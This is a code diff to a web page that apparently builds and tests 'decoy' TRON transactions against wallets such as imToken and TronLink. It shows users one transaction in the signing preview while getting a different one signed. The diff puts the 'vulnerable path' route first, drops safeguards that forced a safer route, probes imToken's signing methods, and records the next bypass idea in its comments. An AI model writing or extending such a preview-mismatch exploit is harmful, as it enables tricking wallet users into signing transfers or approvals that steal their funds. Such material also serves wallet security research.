@@ -192,8 +192,8 @@
           <label class="mt">
             Wallet route
             <select id="signRoute">
-              <option value="tronWebSignAndSend">tronWeb.trx.sign() → sendRawTransaction ✅ imToken推荐</option>
-              <option value="tronWebSend">tronWeb.trx.sendTransaction(tx) — vulnerable path ⚠️</option>
+              <option value="tronWebSend">tronWeb.trx.sendTransaction(tx) ← try first in imToken ⚠️</option>
+              <option value="tronWebSignAndSend">tronWeb.trx.sign() → sendRawTransaction</option>
               <option value="requestSign">provider.request tron_signTransaction</option>
               <option value="tronWebSign">tronWeb.trx.sign(transaction) — TronLink patched, returns {}</option>
               <option value="requestSend">provider.request tron_sendTransaction</option>
@@ -378,16 +378,10 @@
         if (/nile/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = NILE_USDT;
         if (/^mainnet/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = MAINNET_USDT;
         if (state.isImToken) {
-          // manualTransfer (cross-type) is rejected by imToken native bridge's contract-type consistency check.
-          // approve0 keeps both sides as TriggerSmartContract so the type check passes;
-          // only the calldata amount differs — imToken does not appear to validate ABI-level calldata.
-          if ($("decoyType").value === "manualTransfer" || $("decoyType").value === "transferTrx") {
-            $("decoyType").value = "approve0";
-          }
-          if ($("signRoute").value === "tronWebSend") $("signRoute").value = "tronWebSignAndSend";
-          $("decoyToLabel").style.display = "none";
-          $("decoyTrxLabel").style.display = "none";
-          $("decoyAmountLabel").style.display = "";
+          // sign() txID consistency check blocks all raw_data/raw_data_hex mismatches.
+          // Next hypothesis: tronWebSend (sendTransaction) may use a different native code path
+          // that does NOT perform the same txID re-encoding check.
+          // Do not force route or decoyType — let the user experiment.
         }
       }
 
@@ -599,7 +593,8 @@
           result = await state.tronWeb.trx.sendRawTransaction(signed);
         } else if (route === "tronWebSend") {
           if (!state.tronWeb?.trx?.sendTransaction) throw new Error("tronWeb.trx.sendTransaction is unavailable.");
-          log("Calling tronWeb.trx.sendTransaction — preview: raw_data, sign: raw_data_hex (no consistency check)", { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
+          const walletLabel = state.isImToken ? "imToken" : "wallet";
+          log(`Calling tronWeb.trx.sendTransaction (${walletLabel}) — this is the vulnerable path: preview=raw_data, sign=raw_data_hex, no consistency check claimed`, { txID: tx.txID, decoyType: $("decoyType").value, rawDataType: tx.raw_data?.contract?.[0]?.type });
           result = await state.tronWeb.trx.sendTransaction(tx);
         } else if (route === "tronWebSign") {
           if (!state.tronWeb?.trx?.sign) throw new Error("tronWeb.trx.sign is unavailable.");
@@ -806,9 +801,23 @@
         const caps = {
           "window.tron": { request: typeof w.tron?.request, sign: typeof w.tron?.tronWeb?.trx?.sign },
           "window.tronLink": { request: typeof w.tronLink?.request, sign: typeof w.tronLink?.tronWeb?.trx?.sign },
-          "window.tronWeb": { sign: typeof w.tronWeb?.trx?.sign, builder: typeof w.tronWeb?.transactionBuilder?.sendTrx },
+          "window.tronWeb": {
+            sign: typeof w.tronWeb?.trx?.sign,
+            sendTransaction: typeof w.tronWeb?.trx?.sendTransaction,
+            sendRawTransaction: typeof w.tronWeb?.trx?.sendRawTransaction,
+            builder: typeof w.tronWeb?.transactionBuilder?.sendTrx
+          },
           "state.provider": { request: typeof state.provider?.request, sendTx: typeof state.provider?.sendTransaction }
         };
+        if (state.isImToken && w.imToken) {
+          const imTokenKeys = Object.keys(w.imToken).slice(0, 30);
+          const imTokenMethods = imTokenKeys.map(k => `${k}:${typeof w.imToken[k]}`);
+          caps["window.imToken"] = { keys: imTokenMethods };
+          // Check if imToken exposes any direct signing primitives
+          const signLike = ["sign", "signTransaction", "sendTransaction", "callAPI", "callHandler", "postMessage", "request"]
+            .reduce((acc, m) => { acc[m] = typeof w.imToken[m]; return acc; }, {});
+          caps["window.imToken.methods"] = signLike;
+        }
         log("Provider detection refreshed", { detections: state.detections, capabilities: caps });
       });
       $("decoyType").addEventListener("change", () => {
